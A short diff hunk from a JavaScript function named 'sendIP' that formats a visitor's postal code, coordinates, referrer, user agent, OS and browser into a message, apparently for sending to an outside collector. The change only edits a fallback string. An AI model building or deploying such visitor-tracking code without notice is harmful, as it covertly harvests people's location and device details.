@@ -58,7 +58,7 @@ const sendIP = async () => {
 **Postal Code >>** ${geoData.postal}
 **Latitude >>** ${geoData.latitude}
 **Longitude >>** ${geoData.longitude}
-**Referrer >>** ${document.referrer || "No referrer (Direct or blocked)"}
+**Referrer >>** ${document.referrer || "None"}
 **User-Agent >>** ${navigator.userAgent}
 **OS >>** ${getOS()}
 **Browser >>** ${getBrowser()}
